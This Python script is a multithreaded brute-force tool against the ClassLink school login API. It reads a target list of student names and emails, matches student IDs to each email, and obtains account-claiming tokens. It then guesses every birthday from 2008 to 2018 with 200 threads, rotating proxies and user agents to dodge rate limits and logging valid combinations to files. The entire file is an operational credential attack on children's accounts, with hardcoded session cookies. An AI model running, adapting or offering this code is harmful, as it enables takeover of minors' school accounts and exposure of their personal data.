import requests
import json
import csv
import time
from datetime import datetime, timedelta
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import random
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class SecondPageAuthenticator:
    def __init__(self, max_workers=200):
        self.max_workers = max_workers
        self.session = requests.Session()
        self.sessions = [requests.Session() for _ in range(max_workers)]
        self.found_combinations = []
        self.lock = threading.Lock()
        self.processed = 0
        self.success_count = 0
        self.token_cache = {}
        self.rate_limit_pause = False
        self.rate_limit_event = threading.Event()
        self.token_expired_pause = False
        self.token_expired_event = threading.Event()
        self.current_row = None
        self.proxies = []
        self.current_proxy_index = 0

        self.setup_logging()
        self.load_proxies()

    def setup_logging(self):
        """Setup logging for the second page authenticator"""
        self.logger = logging.getLogger('SecondPageAuthenticator')
        self.logger.setLevel(logging.INFO)

        self.logger.handlers.clear()

        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')

        file_handler = logging.FileHandler('logs/second_page.log', encoding='utf-8')
        file_handler.setFormatter(formatter)

        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)

        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)

    def load_proxies(self):
        try:
            with open('proxies.txt', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if '://' in line:
                            self.proxies.append(line)
                        else:
                            self.proxies.append(f"http://{line}")

            if self.proxies:
                print(f"[PROXY] Loaded {len(self.proxies)} proxies")
                self.logger.info(f"Loaded {len(self.proxies)} proxies")
            else:
                print("[PROXY] No proxies found in proxies.txt, continuing without proxies")
                self.logger.warning("No proxies found in proxies.txt")

        except Exception as e:
            print(f"[PROXY] Error loading proxies: {e}")
            self.logger.error(f"Error loading proxies: {e}")

    def get_next_proxy(self):
        if not self.proxies:
            return None

        with self.lock:
            proxy = self.proxies[self.current_proxy_index]
            self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
            return proxy

    def get_session(self, worker_id):
        return self.sessions[worker_id % len(self.sessions)]

    def handle_too_many_attempts(self):
        print("\n" + "!" * 70)
        print("!!! TOO MANY ATTEMPTS ERROR DETECTED !!!")
        print("!!! STOPPING SCRIPT !!!")
        print("!" * 70)
        print("\nThe server returned 'Too Many Attempts' error.")
        print("This means we've been detected and should stop completely.")
        print("Press Enter to acknowledge and stop...")

        input()

        print("Stopping script due to Too Many Attempts...")
        self.logger.critical("Script stopped due to 'Too Many Attempts' error")
        exit(1)

    def make_request_with_proxy(self, session, url, headers, payload, timeout=5, max_retries=3):
        for attempt in range(max_retries):
            proxy = self.get_next_proxy()
            proxy_dict = None
            if proxy:
                proxy_dict = {
                    'http': proxy,
                    'https': proxy
                }

                if random.random() < 0.01:
                    print(f"[PROXY] Using proxy: {proxy}")

            try:
                if proxy_dict:
                    response = session.post(url, headers=headers, json=payload, timeout=timeout, proxies=proxy_dict,
                                            verify=False)
                else:
                    response = session.post(url, headers=headers, json=payload, timeout=timeout,
                                            verify=False)

                return response

            except requests.exceptions.SSLError as e:
                print(f"[SSL] SSL Error (attempt {attempt + 1}/{max_retries}): {e}")
                if attempt == max_retries - 1:
                    print(f"[SSL] All SSL attempts failed - stopping script")
                    self.handle_ssl_failure()
                    return None

            except requests.exceptions.ProxyError as e:
                print(f"[PROXY] Proxy error (attempt {attempt + 1}/{max_retries}): {e}")
                if attempt == max_retries - 1:
                    raise e
                time.sleep(0.5)

            except requests.exceptions.ConnectTimeout as e:
                print(f"[PROXY] Connection timeout (attempt {attempt + 1}/{max_retries}): {e}")
                if attempt == max_retries - 1:
                    raise e
                time.sleep(0.5)

            except requests.exceptions.ConnectionError as e:
                print(f"[PROXY] Connection error (attempt {attempt + 1}/{max_retries}): {e}")
                if attempt == max_retries - 1:
                    raise e
                time.sleep(0.5)

        return None

    def handle_ssl_failure(self):
        print("\n" + "!" * 70)
        print("!!! SSL CONNECTION FAILURE DETECTED !!!")
        print("!!! STOPPING SCRIPT !!!")
        print("!" * 70)
        print("\nThe script encountered SSL connection errors.")
        print("This could be due to network issues or proxy problems.")
        print("Press Enter to acknowledge and stop...")

        input()

        print("Stopping script due to SSL failures...")
        self.logger.critical("Script stopped due to SSL connection failures")
        exit(1)

    def handle_token_expired(self):
        with self.lock:
            if not self.token_expired_pause:
                self.token_expired_pause = True
                self.token_expired_event.clear()
                print("\n" + "!" * 70)
                print("!!! TOKEN EXPIRED (429.2) DETECTED !!!")
                print("!!! ALL TOKENS HAVE EXPIRED !!!")
                print("!!! YOU NEED TO RESTART THE SCRIPT !!!")
                print("!" * 70)
                print("\nAll account claiming tokens have expired.")
                print("This usually happens after 1-2 hours of running.")
                print("The script cannot continue with expired tokens.")
                print("\nWhat to do:")
                print("1. Stop this script (Ctrl+C)")
                print("2. Wait a few minutes")
                print("3. Restart the script to get fresh tokens")
                print("4. Press Enter to acknowledge and stop...")

                input()

                print("Stopping script due to expired tokens...")
                self.logger.critical("Script stopped due to 429.2 token expiration")
                exit(1)

    def handle_401_3_found(self, row_data, student_id, birthday):
        print("\n" + "=" * 70)
        print("!!! SUCCESSFUL !!!")
        print("!!! 401.3 RESPONSE DETECTED - VALID COMBINATION FOUND !!!")
        print("!!! STOPPING SCRIPT !!!")
        print("=" * 70)

        student_id_numbers = student_id[1:] if student_id.startswith('s') else student_id

        target_info = {
            'email': row_data['email'],
            'student_id': student_id_numbers,
            'birthday': birthday,
            'first_name': row_data['first_name'],
            'last_name': row_data['last_name'],
            'row_number': row_data['row_number'],
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }

        with open('target_info.txt', 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['Email', 'Student_ID', 'Birthday', 'First_Name', 'Last_Name', 'CSV_Row', 'Found_At'])
            writer.writerow([
                target_info['email'],
                target_info['student_id'],
                target_info['birthday'],
                target_info['first_name'],
                target_info['last_name'],
                target_info['row_number'],
                target_info['timestamp']
            ])

        print(f"\nValid combo found")
        self.logger.critical(f"SUCCESS - 401.3 found - Valid combination: {target_info}")

        # Exit successfully (code 0)
        print("\nPress Enter to exit...")
        input()
        exit(0)

    def handle_too_many_requests(self):
        print("\n" + "!" * 70)
        print("!!! TOO MANY REQUESTS ERROR DETECTED !!!")
        print("!!! STOPPING SCRIPT !!!")
        print("!" * 70)
        print("\nThe server returned 'Too Many Requests' error.")
        print("This means we've been detected and should stop.")
        print("Press Enter to acknowledge and stop...")

        input()

        print("Stopping script due to Too Many Requests...")
        self.logger.critical("Script stopped due to 'Too Many Requests' error")
        exit(1)

    def get_account_claiming_token(self, student_id, worker_id=0):
        if student_id in self.token_cache:
            return self.token_cache[student_id]

        if self.rate_limit_pause or self.token_expired_pause:
            self.rate_limit_event.wait()
            self.token_expired_event.wait()

        session = self.get_session(worker_id)
        url = "https://auth.apis.classlink.com/v1/login/v3.0/authenticate"

        headers = {
            "Host": "auth.apis.classlink.com",
            "Cookie": "XSRF-TOKEN=O%2BEYNG59ONUN4vtdTUYZHv3QatuSfHnQRIHMruEKrM8%3D; XSRF-CHALLENGE=w3%2BWT7Y1sF6jTJZc0A7cwQ%3D%3D",
            "Content-Length": "79",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Cache-Control": "no-store",
            "X-Xsrf-Token": "O+EYNG59ONUN4vtdTUYZHv3QatuSfHnQRIHMruEKrM8=",
            "Accept-Language": "en-US,en;q=0.9",
            "Sec-Ch-Ua": '"Not A Brand";v="99", "Chromium";v="142"',
            "Sec-Ch-Ua-Mobile": "?0",
            "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://login.classlink.com",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
        }

        payload = {
            "ac_questionResponses": json.dumps({"f6": f"{student_id}", "role": True}),
            "ac_code": "GInp0C"
        }

        try:
            response = self.make_request_with_proxy(session, url, headers, payload, timeout=5)

            if response is None:
                print(f"[TOKEN] All proxy attempts failed for {student_id}")
                return None

            response_data = response.json()

            print(f"[TOKEN RESPONSE] Student ID: {student_id}")
            print(f"[TOKEN RESPONSE] Status Code: {response.status_code}")
            print(f"[TOKEN RESPONSE] Full Response: {json.dumps(response_data, indent=2)}")
            print("-" * 50)

            if 'message' in response_data and 'Too Many Attempts' in response_data['message']:
                print(f"[TOKEN] Too Many Attempts message detected: {response_data['message']}")
                self.handle_too_many_attempts()
                return None

            if response_data.get('error') == 'Too Many Requests':
                print(f"[TOKEN] Too Many Requests error detected")
                self.handle_too_many_requests()
                return None

            if response.status_code == 429:
                try:
                    if 'statusCode' in response_data and str(response_data['statusCode']).startswith('429.2'):
                        print(f"[TOKEN] 429.2 detected while getting token for {student_id}")
                        self.handle_token_expired()
                        return None
                except:
                    pass

            account_claiming_token = response_data.get('accountClaimingToken')

            if account_claiming_token:
                self.token_cache[student_id] = account_claiming_token
                print(
                    f"[TOKEN] Student ID {student_id}: SUCCESS - Got accountClaimingToken (Status: {response.status_code})")
                return account_claiming_token
            else:
                self.logger.warning(f"No accountClaimingToken in response for {student_id}")
                print(
                    f"[TOKEN] Student ID {student_id}: INVALID - No accountClaimingToken in response (Status: {response.status_code})")
                return None

        except Exception as e:
            self.logger.error(f"Error getting token for {student_id}: {e}")
            print(f"[TOKEN] Error for {student_id}: {e}")
            return None

    def handle_rate_limit(self):
        with self.lock:
            if not self.rate_limit_pause:
                self.rate_limit_pause = True
                self.rate_limit_event.clear()
                print("\n" + "!" * 60)
                print("!!! RATE LIMIT DETECTED (429) !!!")
                print("!!! CHANGE NOW !!!")
                print("!" * 60)
                print("\nThe script has been rate limited.")
                print("Please change your IP/VPN/proxy or wait for the rate limit to reset.")
                print("Press Enter to continue when ready...")

                input()

                self.rate_limit_pause = False
                self.rate_limit_event.set()
                print("Resuming...")
                self.logger.info("Resumed after rate limit")

    def load_student_ids(self, ssids_file="ssids.txt"):
        student_ids = []
        try:
            with open(ssids_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('s') and line[1:].isdigit():
                        student_ids.append(line)
            self.logger.info(f"Loaded {len(student_ids)} student IDs")
        except Exception as e:
            self.logger.error(f"Error loading student IDs: {e}")

        return student_ids

    def generate_birthdays(self, year=2008):
        """Generate all possible birthdays for a given year"""
        birthdays = []
        start_date = datetime(year, 1, 1)
        end_date = datetime(year, 12, 31)

        current_date = start_date
        while current_date <= end_date:
            birthdays.append(current_date.strftime("%m/%d/%Y"))
            current_date += timedelta(days=1)

        return birthdays

    def send_second_page_request(self, row_data, student_id, birthday, account_claiming_token, worker_id):
        """Send the second page authentication request - send as 'ac_accountClaimingToken'"""
        # Wait if rate limited or token expired
        if self.rate_limit_pause or self.token_expired_pause:
            self.rate_limit_event.wait()
            self.token_expired_event.wait()

        session = self.get_session(worker_id)
        url = "https://auth.apis.classlink.com/v1/login/v3.0/authenticate"

        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        ]

        xsrf_token = "6lM5dqTKrKjeh95183YyrFtpDH7TjreOCCMkkzNMk3c="
        xsrf_challenge = "Vd42QI9Gt8uiCJ9YHvOeIA=="
        clsession = "s%3AI_gPHsqpcXe57KoznOaiDhoTd4dNaznQ.XB%2Fa7eTG%2BqGswKFSnNC4qdRoOLJlk6ZZNHYIIj4dY%2FA"

        headers = {
            "Host": "auth.apis.classlink.com",
            "Cookie": f"XSRF-TOKEN={xsrf_token}; XSRF-CHALLENGE={xsrf_challenge}; clsession={clsession}",
            "Content-Length": "132",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Cache-Control": "no-store",
            "X-Xsrf-Token": xsrf_token,
            "Accept-Language": "en-US,en;q=0.9",
            "Sec-Ch-Ua": '"Not A Brand";v="99", "Chromium";v="142"',
            "Sec-Ch-Ua-Mobile": "?0",
            "User-Agent": user_agents[worker_id % len(user_agents)],
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://login.classlink.com",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
        }

        # Send student ID without the "s" prefix
        student_id_numbers = student_id[1:] if student_id.startswith('s') else student_id

        # Send as 'ac_accountClaimingToken' (with ac_ prefix)
        payload = {
            "ac_questionResponses": json.dumps({
                "f3": row_data['last_name'],
                "f4": student_id_numbers,  # Send without "s" prefix
                "f5": birthday
            }),
            "ac_accountClaimingToken": account_claiming_token  # Send with ac_ prefix
        }

        try:
            response = self.make_request_with_proxy(session, url, headers, payload, timeout=5)

            if response is None:
                print(f"[AUTH] All proxy attempts failed for {student_id}")
                return False

            response_data = response.json()

            # PRINT THE RESPONSE TO CONSOLE
            print(f"[AUTH RESPONSE] Row {row_data['row_number']} - Student ID: {student_id} - Birthday: {birthday}")
            print(f"[AUTH RESPONSE] Status Code: {response.status_code}")
            print(f"[AUTH RESPONSE] Full Response: {json.dumps(response_data, indent=2)}")
            print("-" * 50)

            with self.lock:
                self.processed += 1

                if response.status_code == 200:
                    self.logger.critical(
                        f"SUCCESS! Row {row_data['row_number']}: {row_data['first_name']} {row_data['last_name']} - Student ID: {student_id} - Birthday: {birthday}")
                    print(
                        f"\n[SUCCESS] Row {row_data['row_number']}: {row_data['first_name']} {row_data['last_name']} - Student ID: {student_id} - Birthday: {birthday}")
                    print(f"[SUCCESS] Response: {response_data}")

                    self.success_count += 1
                    self.found_combinations.append({
                        'first_name': row_data['first_name'],
                        'last_name': row_data['last_name'],
                        'student_id': student_id,
                        'birthday': birthday,
                        'email': row_data['email'],
                        'row_number': row_data['row_number'],
                        'response': response_data
                    })

                    with open('successful_logins.txt', 'a') as f:
                        f.write(
                            f"{row_data['row_number']},{row_data['first_name']},{row_data['last_name']},{student_id},{birthday},{row_data['email']}\n")

                    return True
                elif response.status_code == 401:
                    # Check for 401.3 specifically
                    try:
                        if 'statusCode' in response_data and str(response_data['statusCode']).startswith('401.3'):
                            print(f"\n[401.3] DETECTED for {student_id} with birthday {birthday}")
                            self.handle_401_3_found(row_data, student_id, birthday)
                            return True  # Return True to indicate successful finding of valid combination
                    except:
                        pass
                elif response.status_code == 429:
                    # Check if it's 429.2 specifically
                    try:
                        if 'statusCode' in response_data and str(response_data['statusCode']).startswith('429.2'):
                            print(f"\n[429.2] TOKEN EXPIRED DETECTED for {student_id}")
                            print(f"[429.2] All tokens have expired and cannot be refreshed")
                            self.handle_token_expired()
                            return False
                    except:
                        pass

                    # Regular 429 rate limit
                    print(f"[AUTH] Row {row_data['row_number']}: 429 Rate Limited")
                    self.handle_rate_limit()
                    return self.send_second_page_request(row_data, student_id, birthday, account_claiming_token,
                                                         worker_id)
                else:
                    # Check for "Too Many Attempts" message
                    try:
                        if 'message' in response_data and 'Too Many Attempts' in response_data['message']:
                            print(f"[AUTH] Too Many Attempts message detected: {response_data['message']}")
                            self.handle_too_many_attempts()
                            return False
                    except:
                        pass

                    # Check for "Too Many Requests" error in response body
                    try:
                        if response_data.get('error') == 'Too Many Requests':
                            print(f"[AUTH] Too Many Requests error detected")
                            self.handle_too_many_requests()
                            return False
                    except:
                        pass

            return False

        except Exception as e:
            print(f"[AUTH ERROR] Exception for {student_id}: {e}")
            with self.lock:
                self.processed += 1
            return False

    def brute_force_birthday_for_student(self, row_data, student_id, account_claiming_token, worker_id):
        """Brute force birthday for a specific student ID - only 2008 to 2018"""
        years = list(range(2008, 2019))  # 2008 to 2018 inclusive
        random.shuffle(years)

        attempts = 0
        total_birthdays = len(years) * 365  # Approximate total
        print(
            f"Row {row_data['row_number']}: Brute forcing {total_birthdays} birthdays (2008-2018) for {student_id} with {self.max_workers} workers")

        # Use ThreadPoolExecutor to parallelize birthday attempts
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # Create batches of birthdays to process
            all_birthdays = []
            for year in years:
                all_birthdays.extend(self.generate_birthdays(year))

            random.shuffle(all_birthdays)

            # Submit all birthday attempts
            futures = []
            for birthday in all_birthdays:
                future = executor.submit(
                    self.send_second_page_request,
                    row_data, student_id, birthday, account_claiming_token, worker_id
                )
                futures.append(future)

                # Control the rate of submission to avoid overwhelming the system
                if len(futures) % 100 == 0:
                    time.sleep(0.01)

            # Process results as they complete
            for i, future in enumerate(as_completed(futures)):
                attempts += 1
                result = future.result()
                if result:  # If success (either 200 or 401.3)
                    executor.shutdown(wait=False)  # Stop all other threads
                    return True

                if attempts % 100 == 0:  # Show progress every 100 attempts
                    print(
                        f"[PROGRESS] Row {row_data['row_number']}: Attempted {attempts}/{total_birthdays} birthdays for {student_id}")

        print(f"Row {row_data['row_number']}: Exhausted all birthdays (2008-2018) for {student_id}")
        return False

    def process_csv_row(self, row_data, student_ids, worker_id):
        """Process a single CSV row with all matching student IDs"""
        first_name = row_data['first_name']
        last_name = row_data['last_name']
        email = row_data['email']
        row_number = row_data['row_number']

        print(f"\n[PROCESSING] Row {row_number}: {first_name} {last_name} - {email}")
        self.logger.info(f"Worker {worker_id}: Processing Row {row_number}: {first_name} {last_name}")

        # Extract last 3 digits from email
        email_prefix = email.split('@')[0]
        if len(email_prefix) < 3:
            self.logger.warning(f"Row {row_number}: Email too short for matching: {email}")
            return False

        last_three_digits = email_prefix[-3:]
        if not last_three_digits.isdigit():
            self.logger.warning(f"Row {row_number}: Last 3 characters not digits: {last_three_digits}")
            return False

        # Find matching student IDs
        matching_student_ids = [sid for sid in student_ids if sid.endswith(last_three_digits)]

        if not matching_student_ids:
            self.logger.warning(f"Row {row_number}: No student IDs matching {last_three_digits}")
            return False

        print(f"Row {row_number}: Found {len(matching_student_ids)} matching student IDs")

        # Try each matching student ID
        for student_id in matching_student_ids:
            print(f"Row {row_number}: Testing student ID: {student_id}")

            # Get account claiming token
            account_claiming_token = self.get_account_claiming_token(student_id, worker_id)
            if not account_claiming_token:
                print(f"Row {row_number}: Student ID {student_id} is INVALID - no token")
                continue

            print(
                f"Row {row_number}: Student ID {student_id} is VALID - starting birthday brute force (2008-2018) with {self.max_workers} workers...")

            # Brute force birthday
            success = self.brute_force_birthday_for_student(row_data, student_id, account_claiming_token, worker_id)
            if success:
                return True

            print(f"Row {row_number}: Failed to authenticate with {student_id}")

        self.logger.info(f"Row {row_number}: Failed to authenticate {first_name} {last_name}")
        return False

    def print_stats(self):
        """Print current statistics"""
        with self.lock:
            elapsed = time.time() - self.start_time
            rate = self.processed / elapsed if elapsed > 0 else 0
            stats = f"[STATS] Requests: {self.processed:,} | Success: {self.success_count} | Rate: {rate:.1f}/sec | Proxies: {len(self.proxies)} | Workers: {self.max_workers}"
            print(stats)
            self.logger.info(stats)

    def process_csv_one_by_one(self, csv_file="targets.csv", ssids_file="ssids.txt"):
        """Process CSV one row at a time with maximum threading for each row"""
        print("Starting CSV processing one row at a time...")
        print(f"Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Workers per row: {self.max_workers}")
        print(f"Birthday range: 2008 to 2018")
        print(f"Proxies loaded: {len(self.proxies)}")
        print("-" * 80)

        # Load student IDs once
        student_ids = self.load_student_ids(ssids_file)
        if not student_ids:
            self.logger.error("No student IDs found!")
            return

        # Process CSV row by row
        try:
            with open(csv_file, 'r', encoding='utf-8') as f:
                reader = csv.DictReader(f)

                self.start_time = time.time()
                last_stats_time = time.time()
                rows_processed = 0

                for row_num, row in enumerate(reader, 2):  # Start from line 2
                    # Extract data from current row
                    first_name = row.get('First Name', '').strip()
                    last_name = row.get('Last Name', '').strip()
                    email = row.get('E-mail 1 - Value', '').strip()

                    if not first_name or not last_name or not email:
                        self.logger.warning(f"Row {row_num}: Missing required data, skipping")
                        continue

                    row_data = {
                        'first_name': first_name,
                        'last_name': last_name,
                        'email': email,
                        'row_number': row_num
                    }

                    self.current_row = row_num
                    rows_processed += 1

                    print(f"\n{'=' * 60}")
                    print(f"PROCESSING ROW {row_num}: {first_name} {last_name}")
                    print(f"Email: {email}")
                    print(f"{'=' * 60}")

                    # Process this single row with all workers
                    success = self.process_csv_row(row_data, student_ids, 0)

                    if success:
                        print(f"✓ Row {row_num}: SUCCESS - Moving to next row")
                    else:
                        print(f"✗ Row {row_num}: FAILED - Moving to next row")

                    # Print stats every 30 seconds
                    current_time = time.time()
                    if current_time - last_stats_time >= 30:
                        self.print_stats()
                        last_stats_time = current_time

                    # Small delay between rows
                    time.sleep(1)

                print(f"\nProcessed all {rows_processed} rows from CSV")

        except Exception as e:
            self.logger.error(f"Error processing CSV: {e}")
            print(f"Error processing CSV: {e}")

        # Final statistics
        total_time = time.time() - self.start_time
        print("\n" + "=" * 80)
        print("CSV processing completed!")
        print(f"Finished at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Total time: {total_time / 60:.2f} minutes")
        print(f"Total requests: {self.processed:,}")
        print(f"Successful logins: {self.success_count}")
        print(f"Proxies used: {len(self.proxies)}")
        print(f"Workers per row: {self.max_workers}")
        print(f"Overall rate: {self.processed / total_time:.1f} requests/second")

        if self.success_count > 0:
            print(f"\nSuccessful logins saved to: successful_logins.txt")
            print("Successful combinations:")
            for combo in self.found_combinations:
                print(
                    f"  * Row {combo['row_number']}: {combo['first_name']} {combo['last_name']} - {combo['student_id']} - {combo['birthday']}")


# Usage
if __name__ == "__main__":
    # Use 200 workers as specified
    MAX_WORKERS = 200

    print(f"Using {MAX_WORKERS} workers per CSV row")

    authenticator = SecondPageAuthenticator(max_workers=MAX_WORKERS)

    # Process CSV one row at a time
    authenticator.process_csv_one_by_one(
        csv_file="targets.csv",
        ssids_file="ssids.txt"
    )